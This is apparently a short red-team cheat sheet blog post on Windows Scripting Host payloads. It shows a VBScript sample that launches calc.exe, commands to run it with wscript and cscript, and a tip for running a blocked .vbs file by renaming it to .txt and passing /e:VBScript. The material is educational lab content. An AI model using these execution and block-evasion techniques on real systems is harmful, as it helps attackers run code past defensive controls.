---
title: "[Knowledge] Weaponization and Payloads"
author: Tri Nguyen
date: 2022-05-09 12:00:00 -0700
categories: [Tool, Knowledge, Cheatsheet, RedTeam]
tags: [tool, knowledge, cheatsheet, redteam]
pin: true
---

## Windows Scripting Host (WSH)

- A sample payload
```
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

- To run the payload from the CMD
```terminal
c:\Windows\System32>wscript "c:\Users\thm\Desktop\payload.vbs"
```
```terminal
c:\Windows\System32>cscript.exe "c:\Users\thm\Desktop\payload.vbs"
```

> Run vbs if it's blocked by renaming the file to .txt
{: .prompt-tip }

```terminal
c:\Windows\System32>wscript /e:VBScript "c:\Users\thm\Desktop\payload.txt"
```